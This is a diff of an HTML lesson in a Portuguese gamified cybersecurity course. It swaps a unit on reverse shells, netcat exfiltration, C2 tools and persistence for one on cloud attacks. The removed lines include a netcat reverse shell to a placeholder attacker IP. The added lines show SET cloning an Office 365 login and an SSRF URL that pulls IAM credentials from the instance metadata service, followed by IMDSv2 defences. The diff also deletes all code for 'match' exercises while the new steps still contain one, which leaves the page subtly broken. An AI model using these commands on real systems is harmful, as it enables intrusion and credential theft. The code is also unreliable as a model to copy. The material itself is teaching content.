@@ -9,14 +9,14 @@
     <link rel="dns-prefetch" href="https://fonts.googleapis.com">
     <link rel="dns-prefetch" href="https://fonts.gstatic.com">
     <link rel="dns-prefetch" href="https://cdnjs.cloudflare.com">
-    <title>CyberDuo - Base, Persistência e Escalada</title>
+    <title>CyberDuo - Segurança e Ataques em Nuvem</title>
     <link rel="icon" type="image/svg+xml" href="../assets/favicon.svg">
     <link rel="stylesheet" href="../assets/tailwind.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Inter:wght@300;400;700;800&display=swap" rel="stylesheet">
     <style>
         :root {
-            --cyber-blue: #00f2ff;
+            --cyber-blue: #e6edf3;
             --cyber-green: #00ff41;
             --cyber-red: #ff003c;
             --cyber-yellow: #ffb800;
@@ -27,9 +27,9 @@
         html, body { height: 100%; height: 100dvh; margin: 0; padding: 0; overflow: hidden; }
         body { background-color: var(--bg-dark); color: #e6edf3; font-family: 'Inter', sans-serif; display: flex; flex-direction: column; touch-action: manipulation; }
 
-        .game-header { flex-shrink: 0; padding: max(0.8rem, env(safe-area-inset-top)) 1rem 0.8rem; display: flex; align-items: center; gap: 0.8rem; background: #0d1117; border-bottom: 1px solid rgba(255, 0, 60, 0.2); z-index: 60; }
+        .game-header { flex-shrink: 0; padding: max(0.8rem, env(safe-area-inset-top)) 1rem 0.8rem; display: flex; align-items: center; gap: 0.8rem; background: #0d1117; border-bottom: 1px solid rgba(0, 255, 65, 0.2); z-index: 60; }
         .progress-container { flex-grow: 1; height: 12px; background: #1f2937; border-radius: 10px; overflow: hidden; }
-        .progress-fill { height: 100%; background: var(--cyber-red); width: 0%; transition: width 0.4s ease; border-radius: 10px;}
+        .progress-fill { height: 100%; background: var(--cyber-blue); width: 0%; transition: width 0.4s ease; border-radius: 10px;}
         .hearts { display: flex; gap: 0.3rem; color: var(--cyber-red); min-width: 80px; justify-content: flex-end; font-size: 1.1rem; }
 
         .game-content { flex-grow: 1; overflow-y: auto; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 0.8rem; width: 100%; max-width: 600px; margin: 0 auto; box-sizing: border-box; scrollbar-width: none; }
@@ -39,7 +39,7 @@
         @keyframes slideUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
 
         /* General Typography */
-        .module-subtitle { font-size: 0.7rem; font-weight: 900; color: var(--cyber-red); text-transform: uppercase; letter-spacing: 2px; margin-bottom: 0.5rem; display: flex; align-items: center; gap: 0.5rem; }
+        .module-subtitle { font-size: 0.7rem; font-weight: 900; color: var(--cyber-blue); text-transform: uppercase; letter-spacing: 2px; margin-bottom: 0.5rem; display: flex; align-items: center; gap: 0.5rem; }
         .title-main { font-size: clamp(1.4rem, 5vw, 1.8rem); font-weight: 800; color: white; line-height: 1.2; margin-bottom: 0.5rem; }
         .text-body { font-size: clamp(1rem, 4vw, 1.1rem); color: #b1bac4; line-height: 1.5; }
         .text-body b { color: white; }
@@ -54,7 +54,7 @@
 
         /* TYPE: TEACH */
         .teach-card { background: #0d1117; border: 1px solid #30363d; border-radius: 1.2rem; padding: clamp(1rem, 4vw, 1.5rem); box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        .teach-icon { font-size: 2.5rem; color: var(--cyber-red); margin-bottom: 1rem; }
+        .teach-icon { font-size: 2.5rem; color: var(--cyber-blue); margin-bottom: 1rem; }
         .teach-highlight { display: flex; align-items: center; gap: 0.6rem; background: rgba(0, 255, 65, 0.1); border-left: 3px solid var(--cyber-green); padding: 0.8rem; margin-top: 1rem; font-weight: 600; color: var(--cyber-green); border-radius: 0 0.5rem 0.5rem 0; }
 
         /* TYPE: EXAMPLE */
@@ -68,33 +68,24 @@
         .options-grid { display: flex; flex-direction: column; gap: 0.6rem; width: 100%; }
         .option-card { background: #161b22; border: 2px solid #30363d; border-bottom-width: 4px; padding: clamp(0.8rem, 3vw, 1rem); border-radius: 1rem; cursor: pointer; transition: all 0.1s; display: flex; align-items: center; gap: 1rem; font-weight: 600; font-size: clamp(0.95rem, 4vw, 1.05rem); -webkit-tap-highlight-color: transparent; }
         .option-card:active { transform: translateY(2px); border-bottom-width: 2px; }
-        .option-card.selected { border-color: var(--cyber-red); background: rgba(255, 0, 60, 0.05); }
+        .option-card.selected { border-color: var(--cyber-blue); background: rgba(0, 255, 65, 0.05); }
         .option-card.correct { border-color: var(--cyber-green) !important; background: rgba(0, 255, 65, 0.1) !important; color: var(--cyber-green); }
         .option-card.wrong { border-color: var(--cyber-red) !important; background: rgba(255, 0, 60, 0.1) !important; color: var(--cyber-red); }
         .option-card.disabled { pointer-events: none; opacity: 0.6; }
         .option-number { width: 28px; height: 28px; flex-shrink: 0; border: 2px solid #484f58; border-radius: 0.4rem; display: flex; align-items: center; justify-content: center; font-size: 0.8rem; font-weight: 800; color: #8b949e; }
-        .option-card.selected .option-number { border-color: var(--cyber-red); color: var(--cyber-red); }
+        .option-card.selected .option-number { border-color: var(--cyber-blue); color: var(--cyber-blue); }
 
         /* TYPE: FILL */
         .fill-sentence { font-size: clamp(1.1rem, 5vw, 1.3rem); font-weight: 600; line-height: 1.6; color: white; margin-bottom: 2rem; background: #0d1117; padding: clamp(1rem, 4vw, 1.5rem); border-radius: 1.2rem; border: 1px solid #30363d; }
-        .fill-slot { display: inline-block; min-width: 120px; height: 34px; border-bottom: 3px solid #484f58; margin: 0 0.5rem; vertical-align: middle; text-align: center; color: var(--cyber-red); font-weight: 800; transition: all 0.2s; }
-        .fill-slot.filled { border-bottom-color: var(--cyber-red); }
-
-        /* TYPE: MATCH */
-        .match-container { display: grid; grid-template-columns: 1fr 1fr; gap: 0.6rem clamp(0.5rem, 3vw, 1rem); width: 100%; margin-top: 1rem; }
-        .match-item { background: #161b22; border: 2px solid #30363d; border-bottom-width: 4px; padding: clamp(0.5rem, 2.5vw, 0.8rem); border-radius: 0.8rem; cursor: pointer; text-align: center; font-weight: 600; font-size: clamp(0.85rem, 3.5vw, 0.95rem); transition: all 0.1s; user-select: none; display: flex; align-items: center; justify-content: center; min-height: 60px; height: 100%; -webkit-tap-highlight-color: transparent; }
-        .match-item:active { transform: translateY(2px); border-bottom-width: 2px; }
-        .match-item.selected { border-color: var(--cyber-red); background: rgba(255, 0, 60, 0.1); color: white; }
-        .match-item.matched { border-color: var(--cyber-green); background: rgba(0, 255, 65, 0.05); color: var(--cyber-green); opacity: 0.5; pointer-events: none; }
-        .match-item.error { border-color: var(--cyber-red); animation: shake 0.4s; }
-        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
+        .fill-slot { display: inline-block; min-width: 120px; height: 34px; border-bottom: 3px solid #484f58; margin: 0 0.5rem; vertical-align: middle; text-align: center; color: var(--cyber-blue); font-weight: 800; transition: all 0.2s; }
+        .fill-slot.filled { border-bottom-color: var(--cyber-blue); }
 
         /* FOOTER & BUTTONS */
         .game-footer { flex-shrink: 0; padding: 1rem 1rem max(1rem, env(safe-area-inset-bottom)); background: #0d1117; border-top: 1px solid #1f2937; width: 100%; display: flex; justify-content: center; box-sizing: border-box; z-index: 50; }
         .check-btn { width: 100%; max-width: 400px; padding: 1rem; border-radius: 1rem; font-weight: 800; text-transform: uppercase; cursor: pointer; background: #1f2937; color: #4b5563; border: none; font-size: 1rem; letter-spacing: 1px; transition: all 0.1s; -webkit-tap-highlight-color: transparent; }
         .check-btn:active { transform: scale(0.98); }
-        .check-btn.active { background: var(--cyber-red); color: white; box-shadow: 0 4px 0 #b3002a; }
-        .check-btn.active:active { transform: translateY(4px); box-shadow: 0 0px 0 #b3002a; }
+        .check-btn.active { background: var(--cyber-blue); color: black; box-shadow: 0 4px 0 #a0a8b0; }
+        .check-btn.active:active { transform: translateY(4px); box-shadow: 0 0px 0 #a0a8b0; }
 
         /* FEEDBACK OVERLAY */
         .feedback-overlay { position: fixed; bottom: -100%; left: 0; right: 0; padding: 1.5rem 1.5rem max(1.5rem, env(safe-area-inset-bottom)); transition: bottom 0.3s cubic-bezier(0.18, 0.89, 0.32, 1.28); z-index: 100; border-top-left-radius: 1.5rem; border-top-right-radius: 1.5rem; display: flex; flex-direction: column; align-items: center; text-align: left; }
@@ -108,7 +99,7 @@
 <body>
 
     <div class="game-header">
-        <div class="flex items-center justify-center cursor-pointer text-gray-500" style="min-width: 44px; min-height: 44px; margin-left: -10px;" onclick="window.location.href='../modules/modulo-08.html'"><i class="fas fa-times"></i></div>
+        <div class="flex items-center justify-center cursor-pointer text-gray-500" style="min-width: 44px; min-height: 44px; margin-left: -10px;" onclick="window.location.href='../modules/modulo-07.html'"><i class="fas fa-times"></i></div>
         <div class="progress-container"><div class="progress-fill" id="progressFill"></div></div>
         <div class="hearts" id="heartsContainer"></div>
     </div>
@@ -118,7 +109,7 @@
     <div id="feedbackPopup" class="feedback-overlay">
         <div class="feedback-title" id="fbTitle"></div>
         <div class="feedback-msg" id="fbMsg"></div>
-        <button class="check-btn active w-full" style="max-width: 400px; background: white; color: black; box-shadow: 0 4px 0 #a0a8b0;" onclick="handleContinue()">Continuar</button>
+        <button class="check-btn active w-full" style="max-width: 400px;" onclick="handleContinue()">Continuar</button>
     </div>
 
     <footer class="game-footer" id="footerArea">
@@ -129,96 +120,116 @@
         const steps = [
             {
                 "type": "teach",
-                "icon": "fa-anchor",
-                "title": "Criação de Base e Persistência",
-                "content": "Obter o acesso inicial é apenas o primeiro passo. Sem <b>persistência</b>, uma simples reinicialização do sistema alvo ou uma queda de rede encerra toda a operação.",
-                "highlight": "Persistência garante que o atacante possa voltar ao alvo a qualquer momento."
+                "icon": "fa-cloud",
+                "title": "Modelos de Nuvem & Shadow IT",
+                "content": "As organizações utilizam a nuvem para converter despesas de capital em operacionais. Segundo o NIST, a nuvem possui modelos de serviço: <b>IaaS</b> (Infraestrutura gerida pelo cliente), <b>PaaS</b> (Plataforma gerida pelo provedor) e <b>SaaS</b> (Software pronto). No entanto, a facilidade de provisionar recursos frequentemente gera o <b>Shadow IT</b>, onde administradores perdem o controle de ativos não homologados e softwares desatualizados ficam acessíveis na internet.",
+                "highlight": "A má configuração por desenvolvedores sem conhecimento especializado é a principal brecha na nuvem."
             },
             {
                 "type": "teach",
-                "icon": "fa-network-wired",
-                "title": "Shells Reversos vs. Bind Shells",
-                "content": "<b>Bind Shell:</b> O alvo abre uma porta local e aguarda a conexão do atacante. Porém, frequentemente é bloqueado por firewalls de entrada (inbound).<br><br><b>Shell Reverso (Reverse Shell):</b> O atacante abre uma porta no seu próprio servidor e força a vítima a se conectar a ele. É excelente para <b>burlar firewalls de saída</b> (outbound).",
-                "highlight": "Shell Reverso faz o tráfego fluir de dentro (vítima) para fora (atacante)."
+                "icon": "fa-mask",
+                "title": "Credential Harvesting",
+                "content": "O primeiro grande objetivo de um atacante na nuvem é <b>obter credenciais administrativas</b>. A Colheita de Credenciais usa engenharia social (phishing hiper-direcionado) para enganar usuários. O <b>Social-Engineer Toolkit (SET)</b> é a ferramenta lendária para isso, clonando portais reais de login para capturar cada caractere digitado em requisições POST.",
+                "highlight": "Atacantes também roubam cookies de sessão (via XSS) para burlar o MFA (Múltiplos Fatores de Autenticação)."
             },
             {
                 "type": "example",
                 "icon": "fa-terminal",
-                "title": "Netcat (nc) na Prática",
-                "scenario": "O atacante prepara um servidor para receber a conexão de um Shell Reverso do alvo.",
-                "code": "// Comando no Atacante (Escutando):\nnc -lvp 666\n\n// Comando na Vítima (Conectando de volta):\nnc <IP_ATACANTE> 666 -e /bin/bash",
-                "takeaway": "O firewall do alvo permite tráfego de saída, entregando o bash da vítima ao atacante."
+                "title": "Clonagem com o SET",
+                "scenario": "O atacante inicia o SET no Kali Linux, escolhe as opções de 'Website Attack Vectors' e 'Credential Harvester Method'. O SET então clona o portal do Office 365 e levanta um servidor.",
+                "code": "$ sudo setoolkit\n1) Social-Engineering Attacks\n2) Website Attack Vectors\n3) Credential Harvester Attack Method\n2) Site Cloner\n\n[*] SET Credential Harvester is running on port 80!",
+                "takeaway": "Qualquer tentativa de login na página falsa enviará as credenciais em texto puro para o atacante."
             },
             {
                 "type": "quiz",
-                "task": "Qual a principal vantagem de usar um Shell Reverso (Reverse Shell) em relação a um Bind Shell durante a exploração?",
+                "task": "No Social-Engineer Toolkit (SET), qual método é utilizado para clonar um site legítimo e redirecionar as submissões de formulário (POST) para o servidor do atacante?",
                 "options": [
-                    "É mais eficaz para burlar firewalls configurados para bloquear conexões de entrada (inbound).",
-                    "Criptografa automaticamente todos os pacotes de rede sem uso extra de CPU.",
-                    "Não requer o uso de endereços IP públicos no lado do atacante."
+                    "Credential Harvester Attack Method.",
+                    "Infectious Media Generator.",
+                    "Mass Mailer Attack Vector."
                 ],
-                "correctText": "É mais eficaz para burlar firewalls configurados para bloquear conexões de entrada (inbound).",
-                "explanation": "No Reverse Shell, é a vítima que inicia a conexão de dentro da rede protegida para fora, passando pelas regras comuns de tráfego de saída (outbound)."
+                "correctText": "Credential Harvester Attack Method.",
+                "explanation": "O Credential Harvester é especificamente desenhado para clonar interfaces e capturar credenciais interceptando as requisições POST."
             },
             {
                 "type": "teach",
-                "icon": "fa-toolbox",
-                "title": "O Canivete Suíço: Netcat",
-                "content": "O Netcat (nc) vai muito além de shells de terminal. Ele pode ser usado para transferência de arquivos, requisições Web manuais e port scanning.<br><br>- <b>Receber arquivo:</b> <code>nc -lvp 1234 > output.txt</code><br>- <b>Enviar arquivo:</b> <code>nc -nv <ip> 1234 < input.txt</code><br>- <b>Port Scanner:</b> <code>nc -z <ip> <porta-inicial>-<porta-final></code>",
-                "highlight": "Uma única ferramenta leve permite exfiltração, exploração e varredura."
-            },
-            {
-                "type": "teach",
-                "icon": "fa-ghost",
-                "title": "Infraestrutura C2 e Canais Ocultos",
-                "content": "Para se esconder, atacantes usam sistemas de <b>Comando e Controle (C2)</b> criando canais encobertos (covert channels).<br><br><b>Arsenal de C2:</b><br>- <b>TrevorC2:</b> Usa conexões via WebSockets (escrito em Python).<br>- <b>DNSCat2:</b> Oculta o tráfego via requisições de DNS criptografadas.<br>- <b>Twittor / DBC2:</b> Usam mensagens diretas do Twitter ou o Dropbox para enviar comandos.<br>- <b>WMImplant:</b> Ferramenta baseada em PowerShell que abusa do WMI.",
-                "highlight": "O tráfego malicioso C2 se mistura facilmente com o tráfego de navegação comum."
+                "icon": "fa-stairs",
+                "title": "Escalada de Privilégios & Takeover",
+                "content": "Uma vez com credenciais iniciais, ocorrem as <b>Escaladas de Privilégios</b>. A escalada <b>Vertical</b> ocorre quando um usuário comum acessa funções de admin. A escalada <b>Horizontal</b> ocorre ao acessar dados de outro usuário de mesmo nível. Já no <b>Account Takeover (Aquisição de Conta)</b>, o atacante usa a conta para comprometer a nuvem. Por conta da infraestrutura distribuída, é difícil detectar a invasão, exceto por anomalias como acessos OAuth maliciosos ou logins geográficos suspeitos.",
+                "highlight": "Conexões OAuth de 'apps de terceiros' falsos lendo seus e-mails são táticas clássicas de takeover silencioso."
             },
             {
                 "type": "match",
-                "title": "Associe os utilitários de C2 às suas características.",
+                "title": "Associe as Ameaças",
                 "pairs": [
-                    { "term": "DNSCat2", "definition": "Tráfego oculto via DNS com criptografia" },
-                    { "term": "TrevorC2", "definition": "Comunicação baseada em WebSockets (Python)" },
-                    { "term": "Twittor", "definition": "Uso de mensagens diretas em redes sociais" },
-                    { "term": "WMImplant", "definition": "Abusa do WMI nativo com PowerShell" }
+                    {
+                        "term": "Shadow IT",
+                        "definition": "Ativos na nuvem esquecidos e não homologados pela segurança"
+                    },
+                    {
+                        "term": "Escalada Horizontal",
+                        "definition": "Acessar dados de outro usuário com o mesmo nível de permissão"
+                    },
+                    {
+                        "term": "Escalada Vertical",
+                        "definition": "Elevar privilégios de um usuário comum para administrador"
+                    },
+                    {
+                        "term": "Account Takeover",
+                        "definition": "Sequestrar uma conta e usá-la para movimentação lateral silenciosa"
+                    }
                 ]
             },
             {
                 "type": "teach",
-                "icon": "fa-cogs",
-                "title": "Técnicas de Persistência Nativas",
-                "content": "Em vez de instalar backdoors óbvios que alertam o antivírus, atacantes modificam configurações legítimas do sistema.<br><br>- <b>Tarefas Agendadas:</b> No Windows (Task Scheduler), scripts podem rodar silenciosamente no boot como <b>SYSTEM</b>, ignorando o UAC.<br>- <b>Daemons Customizados:</b> Serviços nativos do Linux configurados para chamar um script nocivo na inicialização.<br>- <b>Contas Ocultas:</b> Criar um usuário invisível com privilégios de root/admin com senha exclusiva.",
-                "highlight": "A Persistência Nativa sobrevive a reinicializações utilizando recursos do próprio sistema."
+                "icon": "fa-cube",
+                "title": "Serviço de Metadados (IMDS)",
+                "content": "Para não usar chaves hardcoded no código, instâncias de nuvem possuem um serviço de metadados interno (<b>IMDS</b>) acessível pelo IP mágico <b>169.254.169.254</b>. Se um site rodando na instância tiver uma falha de <b>SSRF (Server-Side Request Forgery)</b>, o atacante externo pode forçar o servidor a acessar esse IP e roubar tokens de segurança temporários com alto privilégio.",
+                "highlight": "O IMDS responde sem autenticação para solicitações originadas de dentro da instância."
+            },
+            {
+                "type": "example",
+                "icon": "fa-bug",
+                "title": "Roubando Chaves via SSRF",
+                "scenario": "Um atacante identifica um parâmetro vulnerável a SSRF ('?url=') em um app EC2 e aponta para o IMDSv1 para obter credenciais.",
+                "code": "http://vulnerable.com/view?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role\n\n{\n  \"AccessKeyId\": \"ASIA...\",\n  \"SecretAccessKey\": \"wJalrXUtn...\",\n  \"Token\": \"IQoJb3Jp...\"\n}",
+                "takeaway": "O atacante agora possui as credenciais administrativas e pode assumir a identidade da instância (nimbostratus)."
             },
             {
                 "type": "quiz",
-                "task": "Qual técnica nativa do Windows permite que um script malicioso seja executado de forma recorrente com privilégios de SYSTEM, muitas vezes ignorando as restrições do UAC?",
+                "task": "Qual é a vulnerabilidade de aplicação web (sigla) que permite a um atacante forçar um servidor em nuvem a extrair seus próprios metadados e vazar chaves do IP 169.254.169.254?",
                 "options": [
-                    "Tarefas Agendadas (Task Scheduler)",
-                    "Manipulação da tabela ARP",
-                    "Instalação de um Rootkit no Kernel"
+                    "SSRF",
+                    "XSS",
+                    "CSRF"
                 ],
-                "correctText": "Tarefas Agendadas (Task Scheduler)",
-                "explanation": "As tarefas agendadas (Task Scheduler) são frequentemente abusadas para executar código malicioso no nível do sistema, passando despercebidas pela defesa e ignorando o UAC."
+                "correctText": "SSRF",
+                "explanation": "No Server-Side Request Forgery (SSRF), o servidor é induzido a fazer requisições não autorizadas para redes internas, como o endereço de link-local do IMDS."
             },
             {
                 "type": "teach",
-                "icon": "fa-angles-up",
-                "title": "Escalada de Privilégios",
-                "content": "O acesso inicial via exploração remota quase sempre fornece privilégios limitados. A <b>Escalada</b> é o processo para superá-los:<br><br><b>Horizontal:</b> Acesso a funções e conteúdos de outro usuário com o <b>mesmo nível</b> de privilégio (ex: acessar a conta bancária do vizinho alterando o ID de um parâmetro de URL).<br><b>Vertical:</b> Elevação de privilégios. Exploração de falhas no sistema para ir de um usuário padrão para as funções de <b>root (Linux)</b> ou <b>SYSTEM (Windows)</b>.",
-                "highlight": "Vertical = Subir de hierarquia de permissão. Horizontal = Mover-se para os lados acessando dados de terceiros."
+                "icon": "fa-shield",
+                "title": "Defesa com IMDSv2",
+                "content": "Para mitigar ataques SSRF comuns, a AWS lançou o <b>IMDSv2</b>. Nele, requisições GET diretas não funcionam. É exigida uma arquitetura baseada em sessão: o solicitante deve primeiro fazer uma requisição <b>PUT</b> com um cabeçalho específico ('X-aws-ec2-metadata-token') para obter um token de uso, que deve ser anexado nas consultas subsequentes.",
+                "highlight": "Isso bloqueia explorações SSRF triviais, pois o atacante não consegue forçar o envio de cabeçalhos PUT personalizados na maioria dos cenários web."
+            },
+            {
+                "type": "teach",
+                "icon": "fa-key",
+                "title": "O Perigo do User Data",
+                "content": "Na inicialização de VMs, o recurso <b>User Data</b> (AWS) ou Custom Data executa scripts de bootstrap. Frequentemente, desenvolvedores cometem o erro crítico de colocar senhas de banco de dados ou chaves de API em <b>texto puro</b> nesses scripts. Eles ficam armazenados e legíveis no IMDS (/latest/user-data).",
+                "highlight": "Se o IMDS for lido, qualquer segredo no User Data compromete toda a infraestrutura."
             },
             {
                 "type": "fill",
-                "sentence": "Se eu consigo acessar a conta do meu colega mudando o parâmetro ?id=123 para ?id=124, trata-se de uma escalada de privilégios ___.",
+                "sentence": "Para evitar que vulnerabilidades de web pudessem roubar credenciais facilmente do IP de link-local, foi introduzido o ___, que exige o uso de tokens gerados via requisições PUT.",
                 "options": [
-                    "horizontal",
-                    "vertical",
-                    "root"
+                    "IMDSv2",
+                    "IMDSv1",
+                    "SSRF blocker"
                 ],
-                "correctText": "horizontal",
-                "explanation": "Como o nível de permissão (usuário padrão) permaneceu o mesmo, a exploração focou em acessar os dados laterais de outro usuário."
+                "correctText": "IMDSv2",
+                "explanation": "O IMDSv2 adicionou uma camada crítica de defesa em profundidade, exigindo negociação de token com cabeçalhos HTTP que são difíceis de forjar via SSRF."
             }
         ];
 
@@ -226,12 +237,6 @@
         let selectedIdx = null;
         let hearts = 5;
         let shuffledOptions = [];
-        
-        let matchLeft = [];
-        let matchRight = [];
-        let selectedLeft = null;
-        let selectedRight = null;
-        let matchesFound = 0;
 
         function shuffle(array) {
             let currentIndex = array.length, randomIndex;
@@ -288,7 +293,7 @@
                         <h2 class="title-main">${step.title}</h2>
                         <div class="example-scenario text-body">${step.scenario}</div>
                         ${step.code ? `<div class="example-code">${step.code}</div>` : ''}
-                        <div class="example-takeaway"><i class="fas fa-arrow-right mt-1" style="color: var(--cyber-red)"></i> ${step.takeaway}</div>
+                        <div class="example-takeaway"><i class="fas fa-arrow-right mt-1" style="color: var(--cyber-blue)"></i> ${step.takeaway}</div>
                     </div>
                 `;
             }
@@ -328,39 +333,6 @@
                     </div>
                 `;
             }
-            else if (step.type === 'match') {
-                matchesFound = 0;
-                matchLeft = shuffle(step.pairs.map((p, i) => ({text: p.term, id: i})));
-                
-                let isDeranged = false;
-                while (!isDeranged) {
-                    matchRight = shuffle(step.pairs.map((p, i) => ({text: p.definition, id: i})));
-                    isDeranged = true;
-                    for (let j = 0; j < matchLeft.length; j++) {
-                        if (matchLeft[j].id === matchRight[j].id) {
-                            if (matchLeft.length > 1) {
-                                isDeranged = false;
-                                break;
-                            }
-                        }
-                    }
-                }
-                selectedLeft = null;
-                selectedRight = null;
-                
-                area.innerHTML = `
-                    <div class="game-card">
-                        <div class="module-subtitle"><i class="fas fa-link"></i> ASSOCIE OS PARES</div>
-                        <div class="quiz-title">${step.title}</div>
-                        <div class="match-container">
-                                ${matchLeft.map((item, i) => `
-                                    <div class="match-item" id="left-${i}" onclick="selectMatch('left', ${i}, ${item.id})">${item.text}</div>
-                                    <div class="match-item" id="right-${i}" onclick="selectMatch('right', ${i}, ${matchRight[i].id})">${matchRight[i].text}</div>
-                                `).join('')}
-                        </div>
-                    </div>
-                `;
-            }
             
             area.scrollTop = 0;
         }
@@ -382,57 +354,6 @@
             document.getElementById('checkBtn').classList.add('active');
         }
 
-        function selectMatch(side, idx, pairId) {
-            const item = document.getElementById(`${side}-${idx}`);
-            if (item.classList.contains('matched')) return;
-
-            document.querySelectorAll(`.match-item[id^='${side}-']`).forEach(el => {
-                if(!el.classList.contains('matched')) el.classList.remove('selected');
-            });
-            
-            item.classList.add('selected');
-
-            if (side === 'left') selectedLeft = {el: item, id: pairId};
-            else selectedRight = {el: item, id: pairId};
-
-            if (selectedLeft && selectedRight) {
-                if (selectedLeft.id === selectedRight.id) {
-                    selectedLeft.el.classList.remove('selected');
-                    selectedLeft.el.classList.add('matched');
-                    selectedRight.el.classList.remove('selected');
-                    selectedRight.el.classList.add('matched');
-                    matchesFound++;
-                    
-                    if (matchesFound === steps[currentStep].pairs.length) {
-                        document.getElementById('checkBtn').disabled = false;
-                        document.getElementById('checkBtn').classList.add('active');
-                    }
-                } else {
-                    let errLeft = selectedLeft;
-                    let errRight = selectedRight;
-                    selectedLeft = null;
-                    selectedRight = null;
-
-                    errLeft.el.classList.remove('selected');
-                    errLeft.el.classList.add('error');
-                    errRight.el.classList.remove('selected');
-                    errRight.el.classList.add('error');
-                    
-                    hearts--;
-                    updateProgress();
-                    if(hearts <= 0) triggerGameOver();
-
-                    setTimeout(() => {
-                        errLeft.el.classList.remove('error');
-                        errRight.el.classList.remove('error');
-                    }, 500);
-                    return;
-                }
-                selectedLeft = null;
-                selectedRight = null;
-            }
-        }
-
         function checkResponse() {
             const step = steps[currentStep];
             const checkBtn = document.getElementById('checkBtn');
@@ -444,19 +365,13 @@
                 return;
             }
 
-            let isCorrect = false;
-
-            if (step.type === 'quiz' || step.type === 'fill') {
-                isCorrect = shuffledOptions[selectedIdx] === step.correctText;
-                
-                document.querySelectorAll('.option-card').forEach((c, i) => {
-                    if (shuffledOptions[i] === step.correctText) c.classList.add('correct');
-                    else if (i === selectedIdx) c.classList.add('wrong');
-                    c.classList.add('disabled');
-                });
-            } else if (step.type === 'match') {
-                isCorrect = true;
-            }
+            let isCorrect = shuffledOptions[selectedIdx] === step.correctText;
+            
+            document.querySelectorAll('.option-card').forEach((c, i) => {
+                if (shuffledOptions[i] === step.correctText) c.classList.add('correct');
+                else if (i === selectedIdx) c.classList.add('wrong');
+                c.classList.add('disabled');
+            });
 
             if (isCorrect) {
                 document.getElementById('fbTitle').innerHTML = '<i class="fas fa-check-circle"></i> Excelente!';
@@ -492,13 +407,13 @@
             document.getElementById('progressFill').style.width = `100%`;
             document.getElementById('footerArea').classList.add('hidden');
             
-            let nextBtnHtml = `<button class="check-btn active w-full" onclick="window.location.href='../lessons/8.2-lateral-exfiltracao.html'" style="background: var(--cyber-red); color: white; border-color: var(--cyber-red); box-shadow: 0 4px 0 #b3002a; font-size: 1.1rem; padding: 1.2rem; letter-spacing: 2px;">PRÓXIMA LIÇÃO <i class="fas fa-arrow-right ml-2"></i></button>`;
+            let nextBtnHtml = `<button class="check-btn active w-full" onclick="window.location.href='../lessons/7.1b-configuracoes-nuvem.html'" style="background: var(--cyber-green); color: black; border-color: var(--cyber-green); box-shadow: 0 4px 0 #008f20; font-size: 1.1rem; padding: 1.2rem; letter-spacing: 2px;">PRÓXIMA LIÇÃO <i class="fas fa-arrow-right ml-2"></i></button>`;
 
             document.getElementById('gameArea').innerHTML = `
-                <div class="game-card teach-card" style="align-items: center; text-align: center; border-color: var(--cyber-red)">
-                    <i class="fas fa-anchor text-6xl text-red-500 mb-4 mt-4"></i>
-                    <h2 class="title-main mb-2">PERSISTÊNCIA CONCLUÍDA!</h2>
-                    <p class="text-body mb-6">Você garantiu o controle do servidor e aprendeu a escalar privilégios de forma invisível.</p>
+                <div class="game-card teach-card" style="align-items: center; text-align: center; border-color: var(--cyber-blue)">
+                    <i class="fas fa-medal text-6xl text-yellow-400 mb-4 mt-4"></i>
+                    <h2 class="title-main mb-2">SEGREDOS EXTRAÍDOS!</h2>
+                    <p class="text-body mb-6">Você desvendou as táticas de phishing com SET e a exploração de metadados críticos na nuvem.</p>
                     <div style="display: flex; flex-direction: column; gap: 1rem; width: 100%; align-items: center; margin-top: 1rem;">
                         ${nextBtnHtml}
                         <div style="display: flex; gap: 1rem; width: 100%; max-width: 400px; margin-top: 0.5rem;">
@@ -506,7 +421,7 @@
                                 <i class="fas fa-rotate-right mb-1 block text-lg"></i>
                                 <span style="font-size: 0.75rem; display: block; margin-top: 4px;">REINICIAR</span>
                             </button>
-                            <button class="check-btn" onclick="window.location.href='../modules/modulo-08.html'" style="flex: 1; background: #161b22; border: 2px solid var(--cyber-red); color: var(--cyber-red); box-shadow: 0 4px 0 rgba(255,0,60,0.2); padding: 0.8rem 0.5rem;">
+                            <button class="check-btn" onclick="window.location.href='../modules/modulo-07.html'" style="flex: 1; background: #161b22; border: 2px solid var(--cyber-blue); color: var(--cyber-blue); box-shadow: 0 4px 0 rgba(0,255,255,0.2); padding: 0.8rem 0.5rem;">
                                 <i class="fas fa-layer-group mb-1 block text-lg"></i>
                                 <span style="font-size: 0.75rem; display: block; margin-top: 4px;">MÓDULOS</span>
                             </button>
